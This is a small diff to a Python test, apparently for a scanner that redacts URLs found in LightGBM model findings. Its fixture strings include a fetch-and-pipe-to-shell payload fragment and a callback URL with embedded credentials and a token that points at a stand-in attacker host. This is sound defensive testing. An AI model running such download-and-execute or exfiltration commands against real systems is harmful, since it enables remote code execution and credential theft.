@@ -279,7 +279,7 @@ def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
                     "LGB_PATH_SECRET/payload.sh?token=LGB_SECRET#frag | sh') "
                 ),
                 "callback_url=https://lgb_user:lgb_pass@collector.evil.example/"
-                "LGB_PATH_SECRET/payload.sh?token=LGB_SECRET#frag",
+                + "LGB_PATH_SECRET/payload.sh?token=LGB_SECRET#frag",
             ]
         ),
         encoding="utf-8",
